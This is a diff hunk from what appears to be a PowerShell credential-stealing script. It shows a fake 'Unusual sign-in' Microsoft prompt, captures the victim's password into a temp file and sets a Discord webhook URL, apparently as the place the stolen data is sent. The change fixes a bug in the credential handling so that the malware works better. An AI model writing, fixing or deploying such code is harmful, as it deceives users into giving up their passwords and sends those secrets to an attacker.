@@ -49,8 +49,8 @@ Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
 
 $creds = Get-Creds
-if($creds.Length -ne 1) $creds = $creds[$creds.Length - 1];
-$creds = "Password: " + $creds;s
+if($creds -is [system.array]) $creds = $creds[$creds.Length - 1];
+$creds = "Password: " + $creds;
 echo $creds >> $env:TMP\$FileName
 
 $webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
